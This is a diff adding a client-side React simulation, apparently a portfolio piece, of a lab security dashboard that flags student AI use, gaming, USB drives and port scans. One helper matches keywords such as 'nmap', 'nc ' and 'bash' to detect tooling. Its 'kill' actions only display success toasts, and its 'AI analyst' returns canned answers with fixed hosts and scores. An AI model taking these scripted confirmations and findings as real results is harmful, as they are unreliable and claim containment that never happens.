+
+  function inferTerminateTarget(rawLog) {
+    const text = `${rawLog || ''}`.toLowerCase();
+    if (text.includes('nmap') || text.includes('nc ') || text.includes('powershell') || text.includes('bash') || text.includes('openvpn') || text.includes('cmd')) return 'terminal';
+    if (text.includes('brave')) return 'brave';
+    if (text.includes('firefox')) return 'firefox';
+    if (text.includes('chrome') || text.includes('chatgpt') || text.includes('poki')) return 'chrome';
+    return 'terminal';
+  }
+
+  function parseLogFields(raw) {
+    if (!raw) return [];
+    const fields = [];
+    const pidM = raw.match(/PID[:=]\s*(\d+)/i);
+    const userM = raw.match(/User[:=]\s*([^ \]\)]+)/i);
+    const domainM = raw.match(/Domain="?([^" \]]+)"?/i);
+    const toolM = raw.match(/Tool[=:]\s*([^ \]\)]+)/i);
+    const urlM = raw.match(/URL="?([^" ]+)"?/i);
+
+    if (userM)   fields.push({ icon: 'fa-user', label: 'User', value: userM[1] });
+    if (pidM)    fields.push({ icon: 'fa-hashtag', label: 'Process PID', value: pidM[1] });
+    if (domainM) fields.push({ icon: 'fa-link', label: 'Domain', value: domainM[1] });
+    if (toolM)   fields.push({ icon: 'fa-screwdriver-wrench', label: 'Detected Tool', value: toolM[1] });
+    if (urlM)    fields.push({ icon: 'fa-globe', label: 'Target URL', value: urlM[1] });
+
+    fields.push({ icon: 'fa-file-lines', label: 'Raw Event', value: raw.slice(0, 180) });
+    return fields;
+  }
+
+  /* ─────────────────────────────────────────────────────────────
+   * MAIN APPLICATION COMPONENT
+   * ───────────────────────────────────────────────────────────── */
+  function App() {
+    const [alerts, setAlerts] = useState(INITIAL_ALERTS);
+    const [agents, setAgents] = useState(INITIAL_AGENTS);
+    const [tabFilter, setTabFilter] = useState('all');
+    const [sevFilter, setSevFilter] = useState(null);
+    const [agentFilter, setAgentFilter] = useState(null);
+    const [searchQuery, setSearchQuery] = useState('');
+    const [expanded, setExpanded] = useState(new Set());
+    const [toasts, setToasts] = useState([]);
+    const [lastSync, setLastSync] = useState(Date.now());
+    const [showReportModal, setShowReportModal] = useState(false);
+
+    // AI Chatbot State
+    const [askQuery, setAskQuery] = useState('');
+    const [askLoading, setAskLoading] = useState(false);
+    const [askResult, setAskResult] = useState(null);
+
+    // Kill Process Feedback State
+    const [killingId, setKillingId] = useState(null);
+
+    // Periodic Live Incident Simulator (every 18 seconds)
+    useEffect(() => {
+      let poolIndex = 0;
+      const interval = setInterval(() => {
+        const nextIncident = INCIDENT_STREAM_POOL[poolIndex % INCIDENT_STREAM_POOL.length];
+        poolIndex++;
+
+        const newAlert = {
+          id: Date.now(),
+          rule_id: nextIncident.rule_id,
+          rule_name: nextIncident.rule_name,
+          severity: nextIncident.severity,
+          agent_id: nextIncident.agent_id,
+          hostname: nextIncident.hostname,
+          matched_log: nextIncident.log,
+          timestamp: Math.floor(Date.now() / 1000),
+          acknowledged: false,
+        };
+
+        setAlerts(prev => [newAlert, ...prev]);
+        setLastSync(Date.now());
+
+        // Update agent last_seen
+        setAgents(prev => prev.map(a => a.hostname === nextIncident.hostname ? { ...a, last_seen: Math.floor(Date.now() / 1000) } : a));
+
+        // Push toast notification
+        setToasts(prev => [
+          {
+            _tid: `toast-${Date.now()}`,
+            severity: newAlert.severity,
+            hostname: newAlert.hostname,
+            rule_name: newAlert.rule_name,
+            timestamp: newAlert.timestamp,
+          },
+          ...prev.slice(0, 3)
+        ]);
+      }, 18000);
+
+      return () => clearInterval(interval);
+    }, []);
+
+    // Severity Statistics
+    const stats = useMemo(() => {
+      const counts = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0 };
+      alerts.forEach(a => {
+        if (!a.acknowledged && counts[a.severity] !== undefined) {
+          counts[a.severity]++;
+        }
+      });
+      return counts;
+    }, [alerts]);
+
+    // Filtered Alerts
+    const filteredAlerts = useMemo(() => {
+      let res = alerts;
+      if (tabFilter === 'unacked') res = res.filter(a => !a.acknowledged);
+      if (tabFilter === 'high_critical') res = res.filter(a => ['HIGH', 'CRITICAL'].includes(a.severity));
+      if (sevFilter) res = res.filter(a => a.severity === sevFilter);
+      if (agentFilter) res = res.filter(a => a.hostname === agentFilter);
+      if (searchQuery.trim()) {
+        const q = searchQuery.toLowerCase();
+        res = res.filter(a =>
+          a.rule_name.toLowerCase().includes(q) ||
+          a.hostname.toLowerCase().includes(q) ||
+          a.matched_log.toLowerCase().includes(q)
+        );
+      }
+      return res;
+    }, [alerts, tabFilter, sevFilter, agentFilter, searchQuery]);
+
+    // Acknowledge Action (Dismisses row)
+    const handleAcknowledge = (id, e) => {
+      e.stopPropagation();
+      setAlerts(prev => prev.filter(a => a.id !== id));
+      setExpanded(prev => {
+        const next = new Set(prev);
+        next.delete(id);
+        return next;
+      });
+      setToasts(prev => [
+        {
+          _tid: `ack-${Date.now()}`,
+          severity: 'SUCCESS',
+          hostname: 'Dashboard',
+          rule_name: 'Alert marked as acknowledged and dismissed.',
+          timestamp: Math.floor(Date.now() / 1000),
+        },
+        ...prev.slice(0, 3)
+      ]);
+    };
+
+    // Kill Process Action (Instant Interactive Feedback)
+    const handleKillProcess = (alertItem, e) => {
+      e.stopPropagation();
+      const target = inferTerminateTarget(alertItem.matched_log);
+      setKillingId(alertItem.id);
+
+      setTimeout(() => {
+        setKillingId(null);
+        // Mark alert as mitigated
+        setAlerts(prev => prev.map(a => a.id === alertItem.id ? { ...a, matched_log: a.matched_log + ' [PROCESS TERMINATED BY SOC OPERATOR]' } : a));
+
+        setToasts(prev => [
+          {
+            _tid: `kill-${Date.now()}`,
+            severity: 'SUCCESS',
+            hostname: alertItem.hostname,
+            rule_name: `Signal SENT: Terminated '${target}' process on ${alertItem.hostname}. Incident contained!`,
+            timestamp: Math.floor(Date.now() / 1000),
+          },
+          ...prev.slice(0, 3)
+        ]);
+      }, 700);
+    };
+
+    // Kill from machine card
+    const handleMachineKill = (hostname, e) => {
+      e.stopPropagation();
+      const targetSelect = document.getElementById(`select-${hostname}`);
+      const proc = targetSelect ? targetSelect.value : 'terminal';
+      setToasts(prev => [
+        {
+          _tid: `m-kill-${Date.now()}`,
+          severity: 'SUCCESS',
+          hostname: hostname,
+          rule_name: `SIGKILL dispatched for '${proc}' on ${hostname}. Host secure.`,
+          timestamp: Math.floor(Date.now() / 1000),
+        },
+        ...prev.slice(0, 3)
+      ]);
+    };
+
+    // Toggle expand row
+    const toggleExpand = (id) => {
+      setExpanded(prev => {
+        const next = new Set(prev);
+        if (next.has(id)) next.delete(id);
+        else next.add(id);
+        return next;
+      });
+    };
+
+    // AI Quick Insights Engine
+    const handleAskQuestion = (customQ) => {
+      const q = (customQ || askQuery || '').trim();
+      if (!q) return;
+
+      setAskLoading(true);
+      if (customQ) setAskQuery(customQ);
+
+      setTimeout(() => {
+        setAskLoading(false);
+        const qLower = q.toLowerCase();
+
+        let answer = '';
+        let matches = [];
+
+        if (qLower.includes('ai') || qLower.includes('chatgpt') || qLower.includes('gemini') || qLower.includes('claude')) {
+          const aiAlerts = alerts.filter(a => a.matched_log.toLowerCase().includes('chatgpt') || a.matched_log.toLowerCase().includes('ai'));
+          if (aiAlerts.length > 0) {
+            answer = `Identified ${aiAlerts.length} AI assistant violations during the session. lab-pc-02 actively accessed 'chatgpt.com' in browser history.`;
+            matches = [
+              { hostname: 'lab-pc-02', priority: 'High Risk', alert_count: aiAlerts.length, risk_score: 88, ai_domains: ['chatgpt.com', 'openai.com'], recommendations: ['Inspect lab-pc-02 browser tab', 'Enforce exam lockdown proxy'] }
+            ];
+          } else {
+            answer = 'No active AI assistant queries or LLM endpoints detected across lab machines in current window.';
+          }
+        } else if (qLower.includes('game') || qLower.includes('gaming')) {
+          const gameAlerts = alerts.filter(a => a.matched_log.toLowerCase().includes('poki') || a.matched_log.toLowerCase().includes('game'));
+          if (gameAlerts.length > 0) {
+            answer = `Gaming traffic detected on lab-pc-02. WebGL game portal 'poki.com' was loaded during active period.`;
+            matches = [
+              { hostname: 'lab-pc-02', priority: 'Medium', alert_count: gameAlerts.length, risk_score: 62, game_domains: ['poki.com'], recommendations: ['Close active browser window', 'Remind class policy on games'] }
+            ];
+          } else {
+            answer = 'No gaming domains (Steam, Poki, Miniclip) observed in current lab telemetry.';
+          }
+        } else if (qLower.includes('usb')) {
+          const usbAlerts = alerts.filter(a => a.rule_id.startsWith('USB') || a.matched_log.toLowerCase().includes('usb'));
+          answer = `Found ${usbAlerts.length} USB storage attachment events. lab-pc-01 had an unapproved Kingston DataTraveler mounted to /media.`;
+          matches = [
+            { hostname: 'lab-pc-01', priority: 'Immediate Review', alert_count: usbAlerts.length, risk_score: 95, top_commands: ['USB_MOUNT', 'Storage Attached'], recommendations: ['Physical inspection of lab-pc-01 port', 'Block USB mass storage driver'] }
+          ];
+        } else {
+          // General SOC Summary
+          const critCount = stats.CRITICAL;
+          const highCount = stats.HIGH;
+          answer = `Overall Lab Threat Assessment: ${critCount} Critical and ${highCount} High priority incidents currently active. lab-pc-01 requires immediate triage due to unauthorized USB insertion and port scan activity.`;
+          matches = [
+            { hostname: 'lab-pc-01', priority: 'Immediate Review', alert_count: alerts.filter(a=>a.hostname==='lab-pc-01').length, risk_score: 94, top_domains: ['192.168.1.1 (LAN Scan)'], recommendations: ['Isolate network port', 'Terminate unauthorized terminal commands'] },
+            { hostname: 'lab-pc-02', priority: 'Review Soon', alert_count: alerts.filter(a=>a.hostname==='lab-pc-02').length, risk_score: 75, top_domains: ['chatgpt.com', 'poki.com'], recommendations: ['Review browser tabs', 'Verify exam integrity'] }
+          ];
+        }
+
+        setAskResult({ answer, matches });
+      }, 400);
+    };
+
+    return (
+      <div>
+        {/* ── Top Portfolio Banner ── */}
+        <div className="portfolio-ribbon">
+          <div className="ribbon-tag">
+            <a href="../../" className="ribbon-link" style={{marginRight:'8px'}}>&larr; Back to Portfolio</a>
+            <span style={{opacity:0.45}}>|</span>
+            <span>PORTFOLIO SHOWCASE: Cybersecurity SOC Platform for Computer Labs</span>
+          </div>
+          <div className="ribbon-links">
+            <span style={{opacity:0.8}}>Pure Client-Side Simulation</span>
+            <a href="https://github.com/msuryawanshi05/SOC-for-Lab-" target="_blank" rel="noreferrer" className="ribbon-link">
+              <i className="fa-brands fa-github"></i> View Python/TLS Source Code
+            </a>
+          </div>
+        </div>
+
+        {/* ── Header ── */}
+        <header className="header">
+          <div className="logo-icon"><i className="fa-solid fa-desktop" style={{color:'#fff'}}></i></div>
+          <div>
+            <div className="header-title">Lab SOC Platform</div>
+            <div className="header-subtitle">Real-time Endpoint Telemetry &amp; Rule Engine</div>
+          </div>
+          <div className="header-spacer" />
+          <div className="teacher-pill">
+            <i className="fa-solid fa-chalkboard-user"></i>
+            <span>portfolio_reviewer</span>
+            <span style={{opacity:.75}}>· Admin Scope (All Labs)</span>
+          </div>
+          {agentFilter && (
+            <span className="active-filter-chip" onClick={() => setAgentFilter(null)} style={{cursor:'pointer',fontSize:12,padding:'4px 10px',background:'var(--accent-bg)',border:'1px solid var(--accent-br)',borderRadius:20,color:'var(--accent)'}}>
+              <i className="fa-solid fa-desktop"></i> {agentFilter} &times;
+            </span>
+          )}
+          <div className="refresh-pill">
+            <div className="live-dot" />
+            <span>Streaming Live ({timeAgo(lastSync / 1000)})</span>
+          </div>
+        </header>
+
+        {/* ── Summary Ticker ── */}
+        <div className="summary-bar">
+          <div className="sum-item">
+            <div className="sum-icon" style={{color:'var(--online)'}}><i className="fa-solid fa-desktop"></i></div>
+            <div>
+              <div className="sum-value">{agents.length}</div>
+              <div className="sum-label">Monitored Machines</div>
+            </div>
+          </div>
+          <div className="sum-sep" />
+          <div className="sum-item">
+            <div className="sum-icon" style={{color:'var(--accent)'}}><i className="fa-solid fa-bell"></i></div>
+            <div>
+              <div className="sum-value">{alerts.length}</div>
+              <div className="sum-label">Captured Alerts</div>
+            </div>
+          </div>
+          <div className="sum-sep" />
+          <div className="sum-item">
+            <div className="sum-icon" style={{color:'var(--high)'}}><i className="fa-solid fa-triangle-exclamation"></i></div>
+            <div>
+              <div className="sum-value">{alerts.filter(a => !a.acknowledged).length}</div>
+              <div className="sum-label">Pending Action</div>
+            </div>
+          </div>
+          {stats.CRITICAL > 0 && (
+            <>
+              <div className="sum-sep" />
+              <div className="sum-item">
+                <div className="sum-icon" style={{color:'var(--critical)'}}><i className="fa-solid fa-radiation"></i></div>
+                <div>
+                  <div className="sum-value" style={{color:'var(--critical)'}}>{stats.CRITICAL}</div>
+                  <div className="sum-label">Critical Incidents</div>
+                </div>
+              </div>
+            </>
+          )}
+        </div>
+
+        {/* ── Main Content Area ── */}
+        <main>
+          <div className="col-left">
+            {/* Severity Statistic Cards */}
+            <div className="stat-grid">
+              {[
+                { sev: 'CRITICAL', label: 'Critical', desc: 'Immediate incident triage' },
+                { sev: 'HIGH',     label: 'High',     desc: 'Policy violation detected' },
+                { sev: 'MEDIUM',   label: 'Medium',   desc: 'Anomalous process opened' },
+                { sev: 'LOW',      label: 'Low',      desc: 'Routine telemetry log' },
+              ].map(({ sev, label, desc }) => {
+                const count = stats[sev] || 0;
+                const active = sevFilter === sev;
+                return (
+                  <div
+                    key={sev}
+                    className={`stat-card ${sev}${active ? ' active-filter' : ''}`}
+                    onClick={() => setSevFilter(active ? null : sev)}
+                    title={active ? 'Click to clear filter' : `Filter by ${label}`}
+                  >
+                    <div className="stat-label">
+                      {label}
+                      {active && <span style={{fontSize:10,background:'rgba(255,255,255,.12)',padding:'1px 6px',borderRadius:4,float:'right'}}>Filtered</span>}
+                    </div>
+                    <div className="stat-value">{count}</div>
+                    <div className="stat-desc">{desc}</div>
+                  </div>
+                );
+              })}
+            </div>
+
+            {/* Toolbar Filters */}
+            <div className="toolbar">
+              <div className="tab-group">
+                <button className={`tab-btn ${tabFilter === 'all' ? 'active' : ''}`} onClick={() => setTabFilter('all')}>All ({alerts.length})</button>
+                <button className={`tab-btn ${tabFilter === 'unacked' ? 'active' : ''}`} onClick={() => setTabFilter('unacked')}>Unacknowledged ({alerts.filter(a => !a.acknowledged).length})</button>
+                <button className={`tab-btn ${tabFilter === 'high_critical' ? 'active' : ''}`} onClick={() => setTabFilter('high_critical')}>
+                  <i className="fa-solid fa-triangle-exclamation" style={{marginRight:4}}></i>High &amp; Critical
+                </button>
+              </div>
+              <div className="toolbar-spacer" />
+              <input
+                type="text"
+                className="search-input"
+                placeholder="Search alerts, machine, log..."
+                value={searchQuery}
+                onChange={e => setSearchQuery(e.target.value)}
+              />
+            </div>
+
+            {/* Alert Table Feed */}
+            <div className="card alert-feed-card">
+              <div className="card-header">
+                <span className="card-title">
+                  <i className="fa-solid fa-shield-halved" style={{color:'var(--accent)'}}></i> Real-time Security Event Stream
+                </span>
+                <span className="card-count">{filteredAlerts.length} event{filteredAlerts.length !== 1 ? 's' : ''} matching</span>
+              </div>
+              <div className="alert-list">
+                <table>
+                  <thead>
+                    <tr>
+                      <th>Time</th>
+                      <th>Severity</th>
+                      <th>Category</th>
+                      <th>Rule Description</th>
+                      <th>Host Machine</th>
+                      <th>Action</th>
+                      <th style={{width: 28}}></th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {filteredAlerts.length === 0 ? (
+                      <tr>
+                        <td colSpan="7" style={{padding:'40px 20px',textAlign:'center',color:'var(--text-3)'}}>
+                          <i className="fa-solid fa-circle-check" style={{fontSize:32,marginBottom:8,color:'var(--low)',display:'block'}}></i>
+                          <strong>All clear!</strong> No events matching current criteria.
+                        </td>
+                      </tr>
+                    ) : (
+                      filteredAlerts.map(a => {
+                        const src = detectSource(a.matched_log, a.rule_name);
+                        const isExpanded = expanded.has(a.id);
+                        return (
+                          <React.Fragment key={a.id}>
+                            <tr className="alert-row" onClick={() => toggleExpand(a.id)}>
+                              <td style={{color:'var(--text-3)',fontSize:12,whiteSpace:'nowrap'}}>{fmtFull(a.timestamp)}</td>
+                              <td><span className={`sev-badge ${a.severity}`}>{a.severity}</span></td>
+                              <td><span className="src-badge"><i className={`fa-solid ${src.icon}`}></i> {src.label}</span></td>
+                              <td style={{fontWeight:600}}>{humaniseRule(a.rule_name)}</td>
+                              <td>
+                                <span
+                                  style={{color:'var(--accent)',cursor:'pointer',fontWeight:500}}
+                                  onClick={e => { e.stopPropagation(); setAgentFilter(a.hostname); }}
+                                  title="Filter by this host"
+                                >
+                                  {a.hostname}
+                                </span>
+                              </td>
+                              <td>
+                                <div className="row-actions" onClick={e => e.stopPropagation()}>
+                                  <button
+                                    className="ack-btn"
+                                    onClick={e => handleAcknowledge(a.id, e)}
+                                    title="Mark resolved and dismiss"
+                                  >
+                                    <i className="fa-solid fa-check"></i> Acknowledge
+                                  </button>
+                                  <button
+                                    className="terminate-btn"
+                                    onClick={e => handleKillProcess(a, e)}
+                                    disabled={killingId === a.id}
+                                    title="Send SIGKILL to offending PID / app"
+                                  >
+                                    <i className="fa-solid fa-circle-stop"></i>
+                                    {killingId === a.id ? 'Killing...' : 'Kill Process'}
+                                  </button>
+                                </div>
+                              </td>
+                              <td style={{textAlign:'center'}}>
+                                <span className={`expand-chevron ${isExpanded ? 'open' : ''}`}>▾</span>
+                              </td>
+                            </tr>
+                            {isExpanded && (
+                              <tr className="detail-row">
+                                <td colSpan="7">
+                                  <div className="detail-grid">
+                                    <div className="detail-field">
+                                      <div className="detail-icon"><i className="fa-solid fa-tag"></i></div>
+                                      <div>
+                                        <div className="detail-key">Rule Identifier</div>
+                                        <div className="detail-val">{a.rule_id} — {a.rule_name}</div>
+                                      </div>
+                                    </div>
+                                    <div className="detail-field">
+                                      <div className="detail-icon"><i className="fa-solid fa-desktop"></i></div>
+                                      <div>
+                                        <div className="detail-key">Endpoint Host</div>
+                                        <div className="detail-val">{a.hostname} (Agent: {a.agent_id})</div>
+                                      </div>
+                                    </div>
+                                    {parseLogFields(a.matched_log).map((f, idx) => (
+                                      <div key={idx} className="detail-field">
+                                        <div className="detail-icon"><i className={`fa-solid ${f.icon}`}></i></div>
+                                        <div>
+                                          <div className="detail-key">{f.label}</div>
+                                          <div className="detail-val">{f.value}</div>
+                                        </div>
+                                      </div>
+                                    ))}
+                                  </div>
+                                </td>
+                              </tr>
+                            )}
+                          </React.Fragment>
+                        );
+                      })
+                    )}
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+
+          {/* ── Right Column: Machine Control ── */}
+          <div className="col-right">
+            {/* Lab Machine Roster */}
+            <div className="card">
+              <div className="card-header">
+                <span className="card-title"><i className="fa-solid fa-network-wired" style={{color:'var(--accent)'}}></i> Active Endpoints</span>
+                <span className="card-count">{agents.length} online</span>
+              </div>
+              <div className="agents-grid">
+                {agents.map(agent => {
+                  const isSelected = agentFilter === agent.hostname;
+                  return (
+                    <div
+                      key={agent.agent_id}
+                      className={`agent-card${isSelected ? ' selected' : ''}`}
+                      onClick={() => setAgentFilter(isSelected ? null : agent.hostname)}
+                    >
+                      <div className="agent-card-top">
+                        <div className="status-dot online"></div>
+                        <div className="agent-hostname">{agent.hostname}</div>
+                        <span className="status-label-badge online">Active</span>
+                      </div>
+                      <div className="agent-last-seen">{agent.os} · Heartbeat: {timeAgo(agent.last_seen)}</div>
+                      <div className="agent-controls" onClick={e => e.stopPropagation()}>
+                        <select id={`select-${agent.hostname}`} className="agent-control-select">
+                          {TERMINATE_TARGETS.map(t => (
+                            <option key={t.value} value={t.value}>{t.label}</option>
+                          ))}
+                        </select>
+                        <button
+                          className="agent-control-btn"
+                          onClick={e => handleMachineKill(agent.hostname, e)}
+                        >
+                          <i className="fa-solid fa-stop"></i> Kill
+                        </button>
+                      </div>
+                    </div>
+                  );
+                })}
+              </div>
+            </div>
+
+            {/* Architecture Overview */}
+            <div className="card" style={{padding:'16px 18px'}}>
+              <div className="card-title" style={{marginBottom:10}}>
+                <i className="fa-solid fa-microchip" style={{color:'var(--accent)'}}></i> Monitored Signals
+              </div>
+              <div style={{display:'flex',flexDirection:'column',gap:10,fontSize:12}}>
+                <div style={{display:'flex',gap:10}}>
+                  <i className="fa-solid fa-terminal" style={{width:16,color:'var(--accent)'}}></i>
+                  <div><strong>Bash / PowerShell:</strong> Live execution tracking</div>
+                </div>
+                <div style={{display:'flex',gap:10}}>
+                  <i className="fa-solid fa-plug" style={{width:16,color:'var(--critical)'}}></i>
+                  <div><strong>USB Devices:</strong> Mount &amp; exfiltration alerts</div>
+                </div>
+                <div style={{display:'flex',gap:10}}>
+                  <i className="fa-solid fa-globe" style={{width:16,color:'var(--medium)'}}></i>
+                  <div><strong>Browser Activity:</strong> AI &amp; gaming inspection</div>
+                </div>
+                <div style={{display:'flex',gap:10}}>
+                  <i className="fa-solid fa-camera" style={{width:16,color:'var(--high)'}}></i>
+                  <div><strong>Screenshots:</strong> Exam capture detection</div>
+                </div>
+              </div>
+            </div>
+
+            {/* Quick Actions */}
+            <div className="card" style={{padding:'16px 18px'}}>
+              <div className="card-title" style={{marginBottom:10}}>
+                <i className="fa-solid fa-file-invoice" style={{color:'var(--accent)'}}></i> Class Audit
+              </div>
+              <p style={{fontSize:12,color:'var(--text-2)',marginBottom:12}}>
+                Generate an instant session report card summarizing student machine health and security flags.
+              </p>
+              <button
+                className="ack-btn"
+                style={{width:'100%',justifyContent:'center',padding:'8px'}}
+                onClick={() => setShowReportModal(true)}
+              >
+                <i className="fa-solid fa-print"></i> View Class Period Report
+              </button>
+            </div>
+          </div>
+        </main>
+
+        {/* ── AI Assistant & Automated Insights ── */}
+        <section className="bottom-ai">
+          <div className="card chatbot-card">
+            <div className="chatbot-head">
+              <div className="card-title" style={{marginBottom:0}}>
+                <i className="fa-solid fa-robot" style={{color:'var(--accent)'}}></i> SOC AI Analyst Assistant
+              </div>
+              <div className="chatbot-controls">
+                <span style={{fontSize:12,color:'var(--text-3)'}}>Analyzing telemetry window</span>
+                <select className="chatbot-select">
+                  <option>Last 60 Minutes</option>
+                  <option>Last 3 Hours</option>
+                </select>
+              </div>
+            </div>
+            <p style={{fontSize:13,color:'var(--text-2)',marginBottom:8}}>
+              Ask questions about classroom security, AI cheating, gaming, or suspicious process execution.
+            </p>
+
+            <div className="chatbot-ask-row">
+              <input
+                type="text"
+                className="chatbot-input"
+                placeholder="Ask e.g. 'who used AI tools?', 'any USB inserted?', or 'summarize threats'..."
+                value={askQuery}
+                onChange={e => setAskQuery(e.target.value)}
+                onKeyDown={e => { if (e.key === 'Enter') handleAskQuestion(); }}
+              />
+              <button
+                className="ack-btn"
+                onClick={() => handleAskQuestion()}
+                disabled={askLoading}
+                style={{padding:'0 18px'}}
+              >
+                {askLoading ? <><i className="fa-solid fa-spinner fa-spin"></i> Analyzing...</> : <><i className="fa-solid fa-wand-magic-sparkles"></i> Inquire</>}
+              </button>
+            </div>
+
+            {/* Quick Prompt Chips */}
+            <div className="chatbot-quick">
+              <span className="quick-chip" onClick={() => handleAskQuestion('summarize threats')}>
+                <i className="fa-solid fa-list-check"></i> Overall Threat Summary
+              </span>
+              <span className="quick-chip" onClick={() => handleAskQuestion('anyone used AI?')}>
+                <i className="fa-solid fa-brain"></i> AI &amp; LLM Violations
+              </span>
+              <span className="quick-chip" onClick={() => handleAskQuestion('who was playing games?')}>
+                <i className="fa-solid fa-gamepad"></i> Gaming Portal Access
+              </span>
+              <span className="quick-chip" onClick={() => handleAskQuestion('any USB devices connected?')}>
+                <i className="fa-solid fa-plug"></i> USB Storage Insertion
+              </span>
+            </div>
+
+            {/* AI Answer Result Box */}
+            {askResult && (
+              <div className="chatbot-answer-box">
+                <div className="chatbot-answer-title"><i className="fa-solid fa-sparkles"></i> AI SOC Insights</div>
+                <div className="chatbot-answer-text">{askResult.answer}</div>
+
+                {askResult.matches && askResult.matches.length > 0 && (
+                  <div className="chatbot-cards-grid">
+                    {askResult.matches.map((m, i) => (
+                      <div key={i} className="insight-card">
+                        <div style={{display:'flex',justifyContent:'space-between',marginBottom:4}}>
+                          <strong style={{color:'var(--accent)'}}>{m.hostname}</strong>
+                          <span className="src-badge">{m.priority}</span>
+                        </div>
+                        <div>Risk Index: <strong>{m.risk_score}/100</strong> · Incidents: {m.alert_count}</div>
+                        {m.ai_domains && <div style={{color:'var(--critical)',marginTop:2}}>AI Domains: {m.ai_domains.join(', ')}</div>}
+                        {m.game_domains && <div style={{color:'var(--high)',marginTop:2}}>Games: {m.game_domains.join(', ')}</div>}
+                        {m.recommendations && (
+                          <div style={{marginTop:6,paddingTop:6,borderTop:'1px solid var(--border)',color:'var(--text-2)'}}>
+                            <strong>Next Step:</strong> {m.recommendations[0]}
+                          </div>
+                        )}
+                      </div>
+                    ))}
+                  </div>
+                )}
+              </div>
+            )}
+          </div>
+        </section>
+
+        {/* ── Report Card Modal ── */}
+        {showReportModal && (
+          <div className="modal-overlay" onClick={() => setShowReportModal(false)}>
+            <div className="modal-content" onClick={e => e.stopPropagation()}>
+              <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:16,borderBottom:'1px solid var(--border)',paddingBottom:12}}>
+                <h3 style={{fontSize:18,fontWeight:700}}>
+                  <i className="fa-solid fa-file-lines" style={{color:'var(--accent)',marginRight:8}}></i>
+                  Class Period Incident Summary
+                </h3>
+                <button
+                  onClick={() => setShowReportModal(false)}
+                  style={{background:'none',border:'none',color:'var(--text-3)',fontSize:18,cursor:'pointer'}}
+                >
+                  &times;
+                </button>
+              </div>
+
+              <div style={{fontSize:13,lineHeight:1.6,color:'var(--text-2)'}}>
+                <p style={{marginBottom:12}}>
+                  <strong>Lab Session:</strong> Period 3 — Cyber Defense Laboratory<br />
+                  <strong>Generated:</strong> {new Date().toLocaleString()}<br />
+                  <strong>Monitoring Status:</strong> 3 Endpoints Active (100% telemetry online)
+                </p>
+
+                <h4 style={{color:'var(--text)',fontSize:14,marginTop:16,marginBottom:8}}>Host Risk Breakdown</h4>
+                <div style={{display:'flex',flexDirection:'column',gap:8}}>
+                  {agents.map(a => {
+                    const hostAlerts = alerts.filter(al => al.hostname === a.hostname);
+                    return (
+                      <div key={a.hostname} style={{background:'var(--bg-surface-2)',padding:10,borderRadius:8,border:'1px solid var(--border)'}}>
+                        <div style={{display:'flex',justifyContent:'space-between',fontWeight:600,color:'var(--text)'}}>
+                          <span>{a.hostname} ({a.os})</span>
+                          <span>{hostAlerts.length} Flagged Events</span>
+                        </div>
+                        <div style={{fontSize:12,color:'var(--text-3)',marginTop:4}}>
+                          {hostAlerts.length > 0 ? hostAlerts.map(h => h.rule_name).join(' · ') : 'Clean session — no security rules violated.'}
+                        </div>
+                      </div>
+                    );
+                  })}
+                </div>
+
+                <div style={{marginTop:20,display:'flex',justifyContent:'flex-end',gap:10}}>
+                  <button className="ack-btn" onClick={() => window.print()}>
+                    <i className="fa-solid fa-print"></i> Print Report
+                  </button>
+                  <button className="terminate-btn" onClick={() => setShowReportModal(false)}>
+                    Close
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* ── Toast Container ── */}
+        <div className="toast-wrapper">
+          {toasts.map(t => (
+            <div key={t._tid} className={`toast ${t.severity}`} onClick={() => setToasts(prev => prev.filter(x => x._tid !== t._tid))}>
+              <div className="toast-top">
+                <span className={`toast-level ${t.severity}`}>{t.severity}</span>
+                <span className="toast-machine"><i className="fa-solid fa-desktop"></i> {t.hostname}</span>
+                <span className="toast-close">&times;</span>
+              </div>
+              <div className="toast-body">{t.rule_name}</div>
+              <div className="toast-time">{fmtFull(t.timestamp)}</div>
+            </div>
+          ))}
+        </div>
+      </div>
+    );
+  }
+
+  ReactDOM.createRoot(document.getElementById('root')).render(<App />);
+</script>
+</body>
+</html>
